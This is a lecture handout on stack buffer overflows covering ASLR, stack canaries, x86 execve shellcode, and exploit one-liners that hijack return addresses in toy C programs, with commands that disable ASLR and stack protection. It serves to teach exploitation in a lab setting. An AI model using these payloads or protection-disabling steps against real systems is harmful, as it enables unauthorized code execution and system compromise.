# Lecture 2: Stack Overflows

I am assuming you have been through the [Lecture 1
handouts](/Lecture1/README.md). In that handout I have mostly explained about
the concept of memory and stack growth. Before going on with this lecture please
read it fist.  

In this lecture I am planning to cover the following:
* Stack overflow.
* Their protection mechanisms.
    * ASLR.
    * Stack canaries.
* What are shell code.
* Exploiting stack overflows and changing control flow of the program.


Let's begin.  

### Stack overflow.
Programming languages such as C, in which the High level language instructions
maps to typical machine language do not provides any mechanism to identify if
the buffer (char array) declared on to the stack, can take the input more that
was it was supposed to take. The reason for non checking such sort of mechanism
was to achieve speed par to the machine language.  

If you remember the stack diagram from Lecture 1, this is how the stack looks
like during the function call.
```
                       +   Previous function  +
                       |     Stack frame      +
                       |                      |
                       +----------------------+ <--+ previous function stack frame end here
                       |Space for return value|
                       +----------------------+
                       |Arguments for function|
                       +----------------------+
                       |    return address    |
                       +----------------------+
                       |     saved $ebp       |
                       +----------------------+
                       |                      | <--+  padding done by compilers
                       +------------+---------+
                       |         |4 |         |
                       |         |3 |         |
                       |         |2 | ^       |
                       |         |1 | |       |
                       |      ch |0 | |       |
                       +------------+-+-------+                       
                       |                      |
                       |     unused space     |
                       +                      +
```

Observe how the buffer is aligned in the stack. Buffers/char arrays are stored
from lower to higher memory addresses. And also C programs do not checks if size
of the array is less than the input size.  
So we have these things in mind:
* C does not check buffer over flow.
* Buffers are stored in lower to higher memory address.
* Just after the buffer, after overflowing it to certain amount can update saved
* `$ebp` and return address.
* If the return address is changed we can change the control flow. :cool:

### Stack Protection
#### 1. ASLR
> Address space layout randomization (ASLR) is a computer security technique
> involved in preventing exploitation of memory corruption vulnerabilities. In
> order to prevent an attacker from reliably jumping to, for example, a
> particular exploited function in memory, ASLR randomly arranges the address
> space positions of key data areas of a process, including the base of the
> executable and the positions of the stack, heap and libraries. Ref: [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)  

In short ASLR, will keep on changing the starting address of every section will
each run be it either heap or stack. So, ASLR will hinder our exploitation.
What we can do for that? We will disable it. :smile:
We will see about exploiting stack with ASLR enabled systems in future lectures.
For now, you can disable it with this following command:  
`echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`

#### 2. Stack Canaries
>Stack canaries, named for their analogy to a canary in a coal mine, are used to
>detect a stack buffer overflow before execution of malicious code can occur.
>This method works by placing a small integer, the value of which is randomly
>chosen at program start, in memory just before the stack return pointer. Ref:(link)[https://en.wikipedia.org/wiki/Stack\_buffer\_overflow#Stack\_canaries]

This means they just protect your buffers. This is technique implemented by the
compiler to incorporate some random data after the end of buffer in the program
that will allow system to identify the buffer overflows.
For now we will disable that option from the compiler using following option.
`gcc -fno-stackprotector <file>.c`

### Shell Codes
Shell is small piece of payload in binary language that is used to inject to
vulnerable binary files. You can craft the payload for anything. They are just
module level binary code.  
Crafting shellcode is in itself a big topic to cover here. I shall take it in
brief. We will create a shellcode that spawns a shell. First create
shellcode.nasm with the following content.
[In detail](http://www.vividmachines.com/shellcode/shellcode.html)

```
xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     ebx, esp    ;ebx now has address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now has address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now has address of address
                    ;of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
```

Use `nasm` to compile it.  
`nasm -f elf shellcode.asm`

Now you would want to obtain the shell code bytes. What are they? They are
machine code that corresponds to those instructions.
How can we get those? `objdump` will help.
`objdump -d shellcode.o`
You will get something like.
```
shellcode.o:     file format elf32-i386
Disassembly of section .text:

00000000 <.text>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	50                   	push   %eax
  10:	89 e2                	mov    %esp,%edx
  12:	53                   	push   %ebx
  13:	89 e1                	mov    %esp,%ecx
  15:	b0 0b                	mov    $0xb,%al
  17:	cd 80                	int    $0x80
```
You can use the following shell code to get that extracted. :cool:
``for i in `objdump -d shellcode.o | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done``

Exploiting actual programs:
---

#### 1. Lets consider this code.
```c
#include <stdio.h>

void bar()
{
    printf("How come you entered into bar ?\n");
}

void foo()
{
    char buffer[10];
    scanf("%s", buffer);
    printf("Hello ji %s \n", buffer);
}

int main()
{
    foo();
    return 0;
}
```
The task is to change the control flow so that `bar` function is called.
Lets start doing it. Compilation instruction are there in the file.
Identify the buffer location and how far is $ebp from it.
`objdump -d ./first`
```
0804848b <bar>:
 804848b:	55                   	push   %ebp
 804848c:	89 e5                	mov    %esp,%ebp
 ...

080484a4 <foo>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	83 ec 08             	sub    $0x8,%esp
 80484ad:	8d 45 ee             	lea    -0x12(%ebp),%eax
 80484b0:	50                   	push   %eax
 80484b1:	68 a0 85 04 08       	push   $0x80485a0
 80484b6:	e8 b5 fe ff ff       	call   8048370 <__isoc99_scanf@plt>
 80484bb:	83 c4 10             	add    $0x10,%esp
 80484be:	83 ec 08             	sub    $0x8,%esp
 80484c1:	8d 45 ee             	lea    -0x12(%ebp),%eax
 80484c4:	50                   	push   %eax
 80484c5:	68 a3 85 04 08       	push   $0x80485a3
 80484ca:	e8 71 fe ff ff       	call   8048340 <printf@plt>
 80484cf:	83 c4 10             	add    $0x10,%esp
 80484d2:	90                   	nop
 80484d3:	c9                   	leave  
 80484d4:	c3                   	ret    

080484d5 <main>:
...
 80484df:	55                   	push   %ebp
 80484e0:	89 e5                	mov    %esp,%ebp
 80484e2:	51                   	push   %ecx
 80484e3:	83 ec 04             	sub    $0x4,%esp
 80484e6:	e8 b9 ff ff ff       	call   80484a4 <foo>
...

```

Notice these instruction in `foo`  
```
 80484ad:	8d 45 ee             	lea    -0x12(%ebp),%eax
 80484b0:	50                   	push   %eax
 80484b1:	68 a0 85 04 08       	push   $0x80485a0
 80484b6:	e8 b5 fe ff ff       	call   8048370 <__isoc99_scanf@plt>
```

The value of 0x12 is subtracted from `$ebp` and is then pushed to stack for call to `scanf`.
We know that one of them is nothing but buffer that scanf inputs.
This must be the buffer that need to inject. base16(12) == base10(18). Our buffer is 18 bytes from `$ebp`.  

Finally we are ready to craft the payload.  
``echo -e `python -c 'print "A"*18+<Dummay valur for EBP>+<Return address>'` | ./first ``  
The exact payload looks like:    
``echo -e `python -c 'import struct;print "A"*18+"BBBB"+struct.pack("<I", 0x0804848b )'` | ./first ``

```
Hello ji AAAAAAAAAAAAAAAAAABBBB? 
How come you entered into bar ?
Segmentation fault (core dumped)
```

:smile: we exploited the buffer overflow.  

#### Try to solve exploit\_me\_2.c `Shellcode injection` :smile:
* Diable ASLR.
* Find the starting address of the buffer using GDB.
* Over flow stack in such a way that return address is starting address of the
buffer.
* The buffer should contain the shellcode.  
The exploit might look like this:  
```bash
./second `python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print shellcode+"\x90"*(bufferlen-len(shellcode))+"BBBB"+struct.pack("<I", starting address of the buffer)'` 
```


